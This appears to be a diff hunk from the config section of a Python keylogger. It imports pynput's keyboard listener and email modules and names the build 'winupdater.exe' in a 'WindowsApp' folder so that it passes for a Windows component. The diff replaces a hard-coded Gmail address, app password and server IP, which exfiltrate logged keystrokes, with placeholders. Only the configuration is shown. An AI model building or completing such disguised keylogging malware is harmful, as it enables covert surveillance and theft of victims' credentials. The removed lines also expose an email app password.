@@ -10,11 +10,11 @@ from email.mime.text import MIMEText
 from pynput.keyboard import Key, Listener
 
 # === CONFIG ===
-SERVER_IP =  '10.10.6.204'
+SERVER_IP =  'add your server ip (terminal ip)'
 SERVER_PORT = 12345
-EMAIL_USER = 'lucifersupramk4@gmail.com'
-EMAIL_PASS = 'xvvv lnit qrsc whyq'
-EMAIL_TO = 'lucifersupramk4@gmail.com'
+EMAIL_USER = 'enter your mail here'
+EMAIL_PASS = 'enter your password key'
+EMAIL_TO = 'enter your mail here'
 FILENAME = 'winupdater.exe'
 FOLDER_NAME = 'WindowsApp'
 LOG_NAME = 'logs.txt'
